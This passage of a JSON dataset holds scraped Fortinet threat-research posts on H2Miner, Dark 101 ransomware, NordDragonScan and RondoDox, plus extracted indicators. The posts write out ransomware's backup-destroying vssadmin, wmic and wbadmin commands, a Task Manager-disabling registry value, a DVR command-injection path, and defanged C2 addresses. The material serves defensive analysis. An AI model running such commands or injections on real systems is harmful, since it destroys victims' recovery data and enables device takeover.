scripts. It also bundles commercially available hack tools and infostealers, expanding its functionality beyond simple encryption. Ultimately, both the H2Miner and Lcrypt0rx chains converge on the deployment of Monero miners, a hallmark of resource hijacking campaigns. In cloud environments, this results in significant financial impact, as compromised systems incur elevated compute costs, degraded performance, and increased operational risk. The campaign reflects a broader trend: the commodification of cybercrime, where access to prebuilt tools, LLM-generated code, and cheap infrastructure lowers the barrier to entry, enabling even low-skill actors to launch high-impact campaigns. Fortinet customers are protected from the threats described in this report through multiple layers of defense provided by theFortinet Security FabricandFortiGuard security services. FortiGuard Antivirus detects and blocks the components of this campaign with the following signatures: These signatures cover malicious VBScript loaders, PowerShell-based XMRig miners, shell scripts used by Kinsing, Trojans, and stealers, as well as payloads that attempt to overwrite the MBR or beacon to Cobalt Strike infrastructure. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus engine. Customers with up-to-date protections are already secured against these threats. Lacework FortiCNAPPhelps identify misconfigured cloud environments and runtime threats. It detects unauthorized mining activity, lateral movement, and the deployment of tools like XMRig or Kinsing in containerized or VM-based workloads. FortiCNAPP also correlates risk across posture, identity, and behavior to help prioritize critical vulnerabilities before they are exploited. TheFortiGuard Content Disarm and Reconstruction (CDR)service, available on FortiGate and FortiMail, can remove embedded threats from weaponized scripts and files—especially those delivered through phishing or lateral propagation. URLs used in this campaign, including malware delivery servers and C2 infrastructure, are rated as“Malicious Websites”by theFortiGuard Web Filtering service, preventing users from inadvertently accessing harmful payloads or ransom note URLs. FortiGuard IPSprovides network-level detection for indicators of malicious activity associated with both the H2Miner and Lcrypt0rx campaigns. Using deep-packet inspection and updated threat rules, it blocks: These protections cut off active infection vectors by identifying suspicious command-and-control behaviors and known malicious patterns. TheFortiGuard IP Reputation and Anti-Botnet Security Serviceblocks known malicious source IPs involved in mining operations, C2 activity, and dropper infrastructure. This service aggregates data from Fortinet’s global threat intelligence network, including FortiSandbox, honeypots, CERTs, and trusted partners. To help strengthen organizational resilience, Fortinet offers freesecurity awareness trainingthrough theNSE Training Institute: If you believe your organization has been impacted by Lcrypt0rx, H2Miner, or any related threats, please contactthe FortiGuard Incident Response Team To stay informed of new and emerging threats, sign up forFortiGuard Threat Intelligence alerts 78[.]153[.]140[.]6680[.]64[.]16[.]24189[.]208[.]104[.]17547[.]97[.]113[.]36176[.]65[.]137[.]203185[.]156[.]72[.]9680[.]64[.]18[.]161207[.]231[.]109[.]252104[.]21[.]32[.]1 ff1706b37fea16d75b739a5396d9ffba9e4f149dae1891f1d22a2cea4f68432ea729410de4dc397d1fb2ab8f7ae560d32726145d4ef3b34d3c3a566177805c391aee8a425ea53c571a16b8efde05ba01B6cd214bb814362694cc48299ebaf0e50680df49e1866c86697028ea73d28d28d3884cc519c6855ae20d64264d5f6e9357f0fdec4d919db0bd4576dc84aec75244143827116c96f5dcace4f95dff8697 1bf1efeadedf52c0ed50941b10a2f468a7bee104bb486ad0f10331233cc9a9f10dc2c71ce9c6c34668e9636abf61b1ae01e5b2530d4cba34f91c8090d19c92db dbc9125192bd1994cbb764f577ba5ddab3039abf2ad5202f4a9363b418002351da753ebcfe793614129fc11890acedbcccef46c7edf9131ccffc47bd69eb743b 06a482a6096e8ff4499ae69a9c150e92f5f2b61b39105a2b1e6e1a5f4a3863ae9f764ec91535eaf03983b930d9f3bacd 4ASk4RhUyLL7sxE9cPyBiXb82ofekJg2SKiv4MKtCbzwHHLQxVVfVr4D4xhQHyyMTieSM5VUFGR9jZVR5gp6sa1Q2p8SahC89UoMhtsrpaJTvmJBbvy1cTdg38pomPFnW5Z4sniL2izcLQyGBkEGd96TcBJtzQUi6KAL5Ehe4cFpEMNdGF7tFKpJ1DqE8X89Arz88KTafhoTPAseYf2bfcWSjNq1YLaVY7ZkFaU21FivDueX4d7X7UErnyjAWHsVB1mibdTGHzqUTsS5FCMog89GVcQCh FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/old-miner-new-tricks",
      "scraped_at": "2025-07-20T13:40:17.644254",
      "indicators": {
        "ip_address": [],
        "domain": [
          "lmgr",
          "ibsystem",
          "askmgr",
          "usa",
          "ystemconfig",
          "c",
          "pr",
          "DConnector",
          "uietcmd",
          "e",
          "script",
          "ndex",
          "egedit",
          "md",
          "svcr80",
          "sconfig",
          "inRing0",
          "rependingwscript"
        ],
        "hash_md5": [
          "a729410de4dc397d1fb2ab8f7ae560d3",
          "57f0fdec4d919db0bd4576dc84aec752",
          "b3039abf2ad5202f4a9363b418002351",
          "ccef46c7edf9131ccffc47bd69eb743b",
          "d3884cc519c6855ae20d64264d5f6e93",
          "44143827116c96f5dcace4f95dff8697",
          "6868c280c61c0b1e2ab8bf6792f1eef2",
          "da753ebcfe793614129fc11890acedbc",
          "0680df49e1866c86697028ea73d28d28",
          "9e4f149dae1891f1d22a2cea4f68432e",
          "B6cd214bb814362694cc48299ebaf0e5",
          "2726145d4ef3b34d3c3a566177805c39",
          "ff1706b37fea16d75b739a5396d9ffba",
          "dbc9125192bd1994cbb764f577ba5dda",
          "006700e5a2ab05704bbb0c589b88924d",
          "1aee8a425ea53c571a16b8efde05ba01"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [
          "CVE-2021-44228",
          "CVE-2023-32315",
          "CVE-2023-46604"
        ],
        "email": [],
        "url": [
          "https://207",
          "https://bitbucket",
          "http://80",
          "http://176",
          "http://78",
          "http://89",
          "https://s10",
          "http://185",
          "http://47"
        ]
      },
      "threat_score": 0.558659217877095
    }
  },
  {
    "id": "Fortinet_35311",
    "source": "Fortinet",
    "title": "How FortiSandbox 5.0 Detects Dark 101 Ransomware Despite Evasion Techniques",
    "text": "FortiGuard Labs Threat Research Exposing the attack chain—from evasion to ransom note deployment The FortiGuard Labs team recently identified a ransomware that belongs to the Dark 101 malware family. The ransomware is delivered as an obfuscated . NET binary with the objectives of encrypting the victim’s personal files, deleting backup copies and the backup catalog, disabling recovery mode and Task Manager, and ultimately demanding a ransom payment in Bitcoin to decrypt the files. All behavioral data presented in this article was obtained from a Sandbox report, while additional reverse engineering was conducted to uncover further capabilities of the malware. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The FortiSandbox report documented the malware's behavior and provided visual aids to support the analysis. The following Tree View diagram (Figure 1) illustrates the execution sequence, outlining the chronological order of actions and processes initiated by the ransomware. The visual representation provides valuable insights into the malware’s operational flow, allowing users to track its behavior and comprehend its execution logic. Additionally, suspicious indicators triggered during the analysis were recorded (Figure 2), offering further context and aiding in the identification of suspicious and malicious activities. The ransomware first attempts to detect an analysis environment by checking whether the executable is running outside the %Appdata% folder. If so, it introduces a 10-second delay before continuing execution. However, FortiSandbox accurately simulates a realistic user environment by executing the sample from an expected location, allowing the ransomware to proceed without delay or altered behavior, thereby ensuring full visibility during analysis. An image of the sleepOutOfTempFolder function responsible for this environment check and delay is shown in Figure 3. Afterwards, the ransomware copies itself into the %Appdata% folder and renames itself to svchost.exe. This name mimics a legitimate Windows system process, which normally resides in C:\\Windows\\System32. By adopting this trusted name, the ransomware attempts to evade detection and reduce the chance of raising suspicion among users and automated tools. As shown in Figure 4, FortiSandbox correctly flags this process as high risk due to its suspicious behavior and inconsistent file location. As part of its anti-recovery strategy, the Dark 101 ransomware executes a series of destructive system commands designed to eliminate any possibility of restoring encrypted files through Windows’ built-in recovery features. Specifically, it runs the following commands, shown in Figures 5 and 6. The first two commands remove all Volume Shadow copies, which are typically used by the system to restore previous versions of the files. The third command deletes the Windows Backup catalog, effectively severing access to any system image backups that may have been created. By chaining these commands together, the ransomware ensures that both shadow copies and formal backup metadata are eradicated, leaving the victim with no local recovery option. Following the execution of vssadmin, wmic, and wbadmin commands to eliminate recovery options, the Dark 101 ransomware proceeds to disable Task Manager by modifying the Windows Registry. It sets the DisableTaskMgr value under the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System key to 1, which prevents users from launching the Task Manager. This tactic is commonly used to hinder user intervention, making it more difficult to terminate the ransomware process or inspect running activity. By restricting access to a critical system tool, the malware increases its persistence. Figure 7 shows the registry modification captured during execution. After disabling recovery mechanisms and system utilities, the ransomware begins scanning the file system directories for targets to encrypt. It targets user-accessible locations that are likely to contain personal or sensitive data, while avoiding critical system files and directories to prevent system instability. The ransomware maintains a predefined list of file extensions that are associated with documents, images, archives, databases, and other valuable content. Only files matching these extensions are selected for encryption, maximizing impact while minimizing the risk of a system failure. Once a file is identified and deemed valid for encryption, the ransomware encrypts its content and appends a randomly generated four-character extension to the filename. This not only renders the file unusable but also serves as a marker indicating successful encryption. Figure 8 displays a partial list of file extensions targeted during the encryption To inform the victim and demand payment, the Dark 101 ransomware drops a ransom note named read_it.txt into every directory containing encrypted files. This text file serves as an extortion message, notifying the victim that their data has been encrypted and providing detailed instructions on how to make a ransom payment. The note demands payment in Bitcoin and typically includes a unique identifier or contact information, such as an email address, to establish communication with the attacker. This tactic is designed to pressure the victim into complying with the ransom demands. Figure 10 shows the ransom note captured during analysis. With the ransom note deployed and encryption complete, the execution phase of the Dark 101 ransomware is complete. At this point, the malware has disabled recovery options, encrypted valuable files, and left payment instructions to coerce the victim into compliance. FortiSandbox successfully captured each stage of the attack—from evasion and execution to encryption and extortion, enabling comprehensive behavioral analysis and the extraction of threat intelligence. MITRE ATT&CK The table below lists the techniques used by the ransomware. This analysis of Dark 101 ransomware highlights the sophistication of modern malware and the need for proactive defense. FortiSandbox effectively detects and documents malicious behavior, showcasing its critical role in protecting against evolving cyber threats. The malware described in this report is detected and blocked byFortiGuard Antivirusas: MSIL/Kryptik. SAC!tr.ransom The FortiGuard AntiVirus engine is part of the FortiGate, FortiMail, FortiClient, and FortiEDR solutions. Customers who have these products with up-to-date protections are protected. FortiGuard Sandbox servicedetects the ransomware file as High Risk in the Ransomware category. We also suggest that our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end-users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. ae3dd3d1eedb6835e6746d51d9ab21c6 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\DisableTaskMgr = 1 Vssadmin delete shadows /all /quietWmic shadowcopy deleteWbadmin delete catalog –quiet %APPDATA%\\svchost.exeRead_it.txt FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/fortisandbox-detects-dark-101-ransomware-despite-evasion-techniques",
      "scraped_at": "2025-07-20T13:40:25.372895",
      "indicators": {
        "ip_address": [],
        "domain": [
          "r",
          "vchost"
        ],
        "hash_md5": [
          "ae3dd3d1eedb6835e6746d51d9ab21c6"
        ],
        "hash_sha1": [],
        "hash_sha256": [],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.4170616113744076
    }
  },
  {
    "id": "Fortinet_60664",
    "source": "Fortinet",
    "title": "Catching Smarter Mice with Even Smarter Cats",
    "text": "FortiGuard Labs Threat Research How AI is Reshaping the Malware Arms Race From the beginning, the antivirus world has been acat-and-mousegame, where malware authors and antivirus engineers constantly adapt their code to bypass or catch each other. Artificial Intelligence is bringing the game to the next level, with malware authors using AI to improve their malware[1] and anti-virus engineers using AI to assist them with reverse engineering[2]. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Nowadays,nearly all malware is packed and/or obfuscated. AI doesn’t help (yet) for packers: we tried this on a Linux/Prometei botnet sample from February 2025, and the AI would have wasted time reversing the inner logics of the packer if we hadn’t helped it out. To be fair,unpacking is a difficult task that current disassemblers like IDA Pro or Ghidra can’t do either. It’s something an AV analyst has to perform beforehand and then supply the unpacked binary for further analysis. As for obfuscation, the news is far better. While AI would probably fail and require human assistance for complicated obfuscation, it works reasonably well over standard obfuscation and junk code. This is a significant advancement for the antivirus industry. In the example below, the AI successfully analyzed the obfuscation algorithm of Linux/Ladvix. E and implemented a working de-obfuscator.[3] Another technique which has been trending in the malware scene for a few years is the use of specific frameworks (e.g, Flutter [4]) or high-level languages (Go, Rust). Currently, AI struggles with Flutter and Rust malware, which is not surprising because the field is still new. Human researchers struggle to find solutions, too! We tried AI-assistance over the “Flutter assembly” of Android/SpyLoan: it was totally helpless, didn’t map function names or strings, etc. However, when we proceed in a smarter way and produce the Blutter[5]output for the malware, thenAI is able to reconstruct very readable Dart code. AI is quite successful with the older Delphi language. We assume the reason is that LLMs were trained with Delphi and Pascal material. Despite being old, Delphi is still strangely used to implement Linux/Filecoder. BR!tr (aka Trigona) ransomware (sample from April 2025). For example, Ghidra meticulously decompiles the main function of the ransomware. We can immediately identify Delphi function names (e.g SYSTEM_RANDOM), followed by their types (LONGINT, LONGINT), and inner memory management functions (FPC_ANSISTR_DECR_REF). The former are interesting because they correspond to code that the malware author explicitly called. The latter are not interesting for malware analysis as they are inserted by the compiler (Free Pascal Compiler, in this case) to handle Ansi strings. When asked to decompile the same function,the AI smartly removes those inner calls and produces source code that is way easier to readthan what Ghidra gave. The anti-virus world has always been a cat-and-mouse game. While AI is close to defeating standard string and code obfuscation, malware authors are likely to adapt by using more complex obfuscation. Similarly, malware authors can harden reverse engineering by using recent frameworks and languages. So, where’s the progress, might you argue? The main difference is that, for once, the antivirus industry has a new tool that helps it more than the adversary. We areforcingmalware authors to use more complex obfuscation and newer frameworks and languages. Rust is more secure than C? Sure! Butthey have to make the effort to learn how to use Rust, use new libraries, cope with bugs, etc. And while they do that, our LLMs can update and train on those novelties even faster. Yes,it’s the first time in 20 years where time and tools are in our favor. Fortinet customers are already protected from all malware mentioned in this article through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Linux/Ladvix. E, Linux/Prometei. B, Adware/SpyLoan! Android, Linux/Filecoder. BR!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. 943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4 – Linux/Ladvix. Ecc7ab872ed9c25d4346b4c58c5ef8ea48c2d7b256f20fe2f0912572208df5c1a – Linux/Prometei. Bc65298b6cd5a1769c747a0c7fb589ffa12fdf832b64787283953eaa57b65bc1c – Adware/SpyLoan! Androidc08a752138a6f0b332dfec981f20ec414ad367b7384389e0c59466b8e10655ec – Linux/Filecoder. BR!tr [1] https://www.hp.com/us-en/newsroom/press-releases/2024/ai-generate-malware.html [2]https://arxiv.org/html/2504.07574 [3]https://asciinema.org/a/724126Asciinema video of Linux/Ladvix deobfuscation [4]https://www.fortiguard.com/events/5552/virus-bulletin-2024-android-flutter-malware [5]https://github.com/worawit/blutter artificial intelligence FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/catching-smarter-mice-with-even-smarter-cats",
      "scraped_at": "2025-07-20T13:40:33.451297",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ww",
          "i-generate-malware",
          "rxiv",
          "sciinema",
          "ithub"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "943e1539d07eaffa4799661812c54bb67ea3f97c5609067688d70c87ab2f0ba4"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://github.com/worawit/blutter",
          "https://asciinema.org/a/724126Asciinema",
          "https://www.fortiguard.com/events/5552/virus",
          "https://arxiv.org/html/2504.07574",
          "https://www.hp.com/us"
        ]
      },
      "threat_score": 0.6329113924050632
    }
  },
  {
    "id": "Fortinet_67745",
    "source": "Fortinet",
    "title": "NordDragonScan: Quiet Data-Harvester on Windows",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attacksSeverity Level:High FortiGuard Labs recently uncovered an active delivery site that hosts a weaponized HTA script and silently drops the infostealer “NordDragonScan”into victims’ environments. Once installed, NordDragonScan examines the host and copies documents, harvests entire Chrome and Firefox profiles, and takes screenshots. The package is then sent over TLS to its command-and-control server, “kpuszkiev.com,” which also serves as a heartbeat server to confirm the victim is still online and to request additional data when needed. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. Attackers leverage shorter link services with “hxxps://cutt[.]ly/4rnmskDe” that redirects to “hxxps://secfileshare[.]com,” triggering the download of a RAR archive named “Укрспецзв_Акт_30_05_25_ДР25_2313_13 від 26_02_2025.rar” (Ukrspetszv_Act_30_05_25_DR25_2313_13 dated 26_02_2025). This file contains a malicious LNK shortcut that silently invokes mshta.exe to execute the hosted HTA payload “1.hta” from the same server. The malicious HTA file copies the legitimate PowerShell.exe binary to the path “C:\\Users\\Public\\Documents\\install.exe” to mask itself. It then downloads an encoded TXT file from a remote server, decodes it, and saves the result as “Act300525.doc.” This decoy document, titled “Акт здачі-приймання наданих Послуг до договору про надання послуг” (Act of Acceptance of Services under Service Agreement), is benign and intended to distract the user. Finally, the HTA script quietly drops and executes the actual malicious payload, embedded as a hardcoded executable named adblocker.exe, into the victim’s directory “\\AppData\\Local\\Temp\\adblocker.exe.” The attacker’s server maintains multiple decoy files designed to entice user interactions. These decoys employ a similar HTA script mechanism, which drops and executes the same payload, “adblocker.exe,” on compromised systems. The repeated use of the same executable across diverse decoys suggests a systematic approach by the threat actor to maximize infection opportunities while utilizing varied document themes and filenames to evade detection and security monitoring. The payload is a . NET executable containing an embedded PDB path: “C:\\Users\\NordDragon\\Documents\\visual studio.” NordDragonScan employs a custom string obfuscation routine, which performs an XOR operation and byte-swapping to conceal hard-coded strings from static analysis. It initially verifies if its dedicated working directory, “NordDragonScan,” exists in the “%LOCALAPPDATA%” folder. If this directory is absent, it creates it as a staging area to temporarily store stolen data before uploading it to the C2 server. It contacts the C2 server, ”kpuszkiev.com,” that contains specially crafted HTTP headers, specifically, “User-Agent: RTYUghjNM,” along with the victim machine’s MAC address. During its initial connection, the primary objective is to retrieve a dynamic URL from the C2, which it later leverages as an endpoint for exfiltrating stolen data. It then sets up persistence by adding a registry “NordStar” in “Software\\Microsoft\\Windows\\CurrentVersion\\Run.” After the connection, NordDragonScan pivots to local reconnaissance. It retrieves the victim’s basic information, including computer name, username, OS version, architecture, processor count, driver information, and RAM using a combination of WMI (Win32_OperatingSystem, Win32_ComputerSystem) and . NET environment calls. The stealer then enumerates every active network adapter, extracts the primary IPv4 address and subnet mask, and calculates the full CIDR range. It then initiates lightweight probes to each address in the same subnet, building an inventory of reachable hosts on the same local area network (LAN). It also captures a screenshot and saves it as “SPicture.png” and collects data from the targeted Chrome and Firefox browsers. NordDragonScan next scans the local file system, includingDesktop,Documents, andDownloadsfolders, and copies the files in these folders with the following extensions: “.docx,” “.doc,” “.xls,” “.ovpn,” “.rdp,” “.txt,” and “.pdf.”Once it obtains a matched file, it copies it into the working directory and groups it according to the source from which it was obtained. When the scanning stage is complete, it initiates a POST to the C2 server. That request carries the custom header “User-Agent: Upload,” a second header, “Backups:,” and the name of the data it is about to send, such as “sysinfo.txt” for system information. NordDragonScan utilizes an effective distribution network for dissemination. The RAR file contains LNK calls that invoke mshta.exe to execute a malicious HTA script, displaying a decoy document in Ukrainian. Finally, it quietly installs its payload in the background. NordDragonScan is capable of scanning the host, capturing a screenshot, extracting documents and PDFs, and sniffing Chrome and Firefox profiles. Users should treat LNK shortcuts and untrusted compressed archives with extreme caution. The malware described in this report is detected and blocked byFortiGuard Antivirusas: LNK/Agent. ALC!trVBS/Dropper. B!trMSIL/Agent. FFF!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. The FortiGuard CDR (Content Disarm and Reconstruction) service, which runs on both FortiGate and FortiMail, can disarm the malicious macros in the document. We also suggest that organizations go through Fortinet’s freeNSE trainingmodule:FCF Fortinet Certified Fundamentals. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP ReputationandAnti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. secfileshare[.]comkpuszkiev[.]com 2102c2178000f8c63d01fd9199400885d1449501337c4f9f51b7e444aa6fbf50e07b33b5560bbef2e4ae055a062fdf5b6a7e5b097283a77a0ec87edb7a3547253f3e367d673cac778f3f562d0792e4829a919766460ae948ab2594d922a0edae f8403e30dd495561dc0674a3b1aedaea5d6839808428069d98e30e19bd6dc045fbffe681c61f9bba4c7abcb6e8fe09ef4d28166a10bfeb73281f874d84f69b3d39c68962a6b0963b56085a0f1a2af25c7974a167b650cf99eb1acd433ecb772b9d1f587b1bd2cce1a14a1423a77eb746d126e1982a0a794f6b870a2d7178bd2c7b2b757e09fa36f817568787f9eae8ca732dd372853bf13ea50649dbb62f0c5b f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0 FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/norddragonscan-quiet-data-harvester-on-windows",
      "scraped_at": "2025-07-20T13:40:41.783870",
      "indicators": {
        "ip_address": [],
        "domain": [
          "",
          "owerShell",
          "shta",
          "dblocker",
          "puszkiev",
          "ysinfo",
          "Picture",
          "nstall",
          "ct300525"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "f4f6beea11f21a053d27d719dab711a482ba0e2e42d160cefdbdad7a958b93d0"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.3728070175438597
    }
  },
  {
    "id": "Fortinet_99614",
    "source": "Fortinet",
    "title": "RondoDox Unveiled: Breaking Down a New Botnet Threat",
    "text": "FortiGuard Labs Threat Research A new botnet built for evasion and disruption Affected Platforms:TBK DVR-4104. TBK DVR-4216. Four-Faith router models F3x24. Four-Faith router models F3x36. Impacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High Over the past month, FortiGuard Labs has observed a significant increase in scanning activity, including a new botnet campaign that exploits two high-risk vulnerabilities:CVE-2024-3721andCVE-2024-12856. Both have been publicly disclosed and are actively being targeted, posing serious risks to device security and overall network integrity. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The botnet responsible for these attacks has been namedRondoDox. Unlike widespread variants such as Mirai or Gafgyt, RondoDox is a relatively new and low-profile threat. FortiGuard Labs first identified a similar ELF binary in September 2024. Notably, RondoDox incorporates custom libraries and mimics traffic from gaming platforms or VPN servers to evade detection. CVE-2024-3721is a critical vulnerability affecting TBK DVR models, including DVR-4104 and DVR-4216, as of April 12, 2024. The flaw stems from improper handling of the /device.rsp?opt=sys&cmd=___S_O_S_T_R_E_A_MAX___ path, where the mdb and mdc parameters can be manipulated to inject OS commands. Successful exploitation allows remote attackers to execute arbitrary commands on affected devices. CVE-2024-12856impacts Four-Faith router models F3x24 and F3x36. The vulnerability allows authenticated remote attackers to execute arbitrary operating system commands via HTTP by exploiting the apply.cgi interface when modifying the system time. RondoDox was initially distributed to target Linux-based operating systems running on ARM and MIPS architectures. However, recent findings show the emergence of a shell script downloader that suggests the malware is now capable of targeting a broader range of Linux architectures, including Intel 80386, MC68000, MIPS R3000, PowerPC, SuperH, ARCompact, x86-64, and AArch64. The shell script begins by instructing the victim host to ignore several signals, including SIGTTOU, SIGTTIN, SIGTSTP, SIGHUP, SIGPIPE, SIGINT, SIGQUIT, and SIGTERM. It then checks for writable paths such as /dev, /dev/shm, the victim user’s home directory, /mnt, /run/user/0, /var/log, /var/run, /var/tmp, and /data/local/tmp, verifying if any are mounted without the noexec flag as listed in /proc/mounts. Finally, it creates a lib directory inside /tmp, downloads and executes the “RondoDox” malware, and clears the command execution history to evade detection. The following analysis focuses on the x86-64 architecture binary named rondo.x86_64. The RondoDox malware encodes its configuration data using a simple XOR obfuscation algorithm. This includes elements such as file paths and tool filenames. All encoded values can be decrypted using the hexadecimal key 0x21. After decoding its configuration data, RondoDox implements a persistence mechanism to maintain its presence on the victim host. RondoDox modifies file permissions and symbolic links to establish persistence. As shown in Figure 6, the XOR-encoded values byte_51D670 and byte_51D6C0 decode to /etc/init.d/rondo and /etc/rc3.d/S99rondo, respectively. Additionally, the malware embeds a shell script designed to execute its persistence routines on the victim system. In addition to using init scripts, RondoDox appends its launch command to several system startup files, including /etc/rcS, /etc/init.d/rcS, and /etc/inittab, as well as to both user and root crontab entries. This layered persistence strategy ensures that even if one method is removed or disabled, others remain active to automatically reinstate the botnet upon system reboot. Upon execution, RondoDox retrieves its own process ID and scans the system for specific applications. It looks for keywords associated with network utilities (such as wget and curl), system analysis tools (like Wireshark and gdb), or other malware (e.g., cryptominers or Redtail variants). If any such processes are detected, RondoDox immediately terminates them to evade analysis and maintain operational stealth. During analysis of RondoDox, we noticed that the malware writes the email address vanillabotnet@protonmail[.]com to the file tmp/contact.txt. However, no further use of this address has been observed within the malware’s execution flow or command logic. Next, RondoDox scans several common Linux executable directories, including: It then renames selected executable files to hardcoded strings of random characters. This action is intended to disrupt critical system functions, including firewall configuration, user account management, and shutdown operations. By corrupting these binaries, the malware impairs system stability and complicates recovery efforts. Original File Name Modified File Name After completing its setup routines, RondoDox decodes its command-and-control (C2) server address—83[.]150[.]218[.]93—using the key \"rondo\", and then initiates a connection to the server. The malware receives commands from its C2 server for subsequent DDoS attacks. RondoDox is capable of launching distributed denial-of-service (DDoS) attacks using three primary protocols: HTTP, UDP, and TCP. To evade detection, it disguises malicious traffic by emulating popular games and platforms such as Valve, Minecraft, Dark and Darker, Roblox, DayZ, Fortnite, GTA, as well as tools like Discord, OpenVPN, WireGuard, and RakNet. For example, when RondoDox receives a command from its C2 server to attack a specific target while impersonating OpenVPN traffic, it crafts packet payloads that include the OpenVPN \"magic byte,\" which begins with \\x38, as shown in Figure 17. Beyond gaming and chat protocols, RondoDox can also mimic custom traffic from tunneling and real-time communication services, including WireGuard, OpenVPN variants (e.g., openvpnauth, openvpncrypt, openvpntcp), STUN, DTLS, and RTC. By impersonating these legitimate services, the malware significantly increases the difficulty for defenders in effectively identifying and blocking its traffic. RondoDox is a sophisticated and emerging malware threat that employs advanced evasion techniques, including anti-analysis measures, XOR-encoded configuration data, custom-built libraries, and a robust persistence mechanism. These capabilities allow it to remain undetected and maintain long-term access on compromised systems. The malware primarily exploits two known vulnerabilities—CVE-2024-3721andCVE-2024-12856—highlighting the critical need for timely patching of affected systems. Its use of obfuscation, service mimicry, and multi-layered persistence underscores its growing threat potential. Ongoing monitoring, threat intelligence sharing, and in-depth behavioral analysis are crucial for comprehending the full extent of RondoDox and for developing effective detection and mitigation strategies. The malware described in this report is detected and blocked byFortiGuard Antivirusas: BASH/RondoDox. A!tr.dldrELF/RondoDox. CTO!tr FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each of these solutions. As a result, customers who have these products with up-to-date protections are protected. TheFortiGuard Web Filtering Serviceblocks the C2 server. FortiGuard Labs provides an IPS signature against attacks exploiting the following vulnerabilities: CVE-2024-3721: TBK. DVR. SOSTREAMAX. Command. InjectionCVE-2024-12856: Four-Faith. Routers.adj_time_year. Command. Injection We also suggest that organizations consider completingFortinet’s free trainingmodule,Fortinet Certified Fundamentals(FCF) in Cybersecurity. This module is designed to help end users learn how to identify and protect themselves from phishing attacks. FortiGuard IP Reputation and Anti-Botnet Security Serviceproactively block these attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. 45[.]135[.]194[.]3483[.]150[.]218[.]9314[.]103[.]145[.]20214[.]103[.]145[.]211154[.]91[.]254[.]9578[.]153[.]149[.]90 c88f60dbae08519f2f81bb8efa7e6016c6770e66e58d77ab6384069a515e451ceb3e2a6a50f029fc646e2c3483157ab112f4f017406c3aabedaae0c94e0969f6f4cd7ab04b1744babef19d147124bfc0e9e90d557408cc2d652d7192df61bda9 